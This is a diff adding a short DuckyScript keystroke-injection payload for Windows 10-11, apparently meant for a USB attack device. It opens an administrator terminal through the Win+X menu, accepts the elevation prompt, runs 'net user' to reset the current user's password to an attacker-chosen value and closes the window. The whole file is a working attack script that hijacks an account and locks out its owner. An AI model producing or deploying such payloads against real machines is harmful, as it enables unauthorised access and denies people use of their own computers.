@@ -1,0 +1,32 @@
+REM ############################################################
+REM #                                                          |
+REM # Title        : Change the password of the Windows user   |
+REM # Author       : Aleff                                     |
+REM # Version      : 1.0                                       |
+REM # Category     : Execute                                   |
+REM # Target       : Windows 10-11                             |
+REM #                                                          |
+REM ############################################################
+
+REM Requirements:
+REM     - Nothing (i know it's absurd)
+
+REM You must define the new Windows user password
+DEFINE NEW_PASSWORD example
+
+DELAY 1000
+GUI x
+DELAY 500
+STRING a
+DELAY 500
+LEFT_ARROW
+DELAY 500
+ENTER
+
+DELAY 2000
+STRING net user $env:USERNAME 
+STRING NEW_PASSWORD
+ENTER
+DELAY 1000
+
+ALT F4
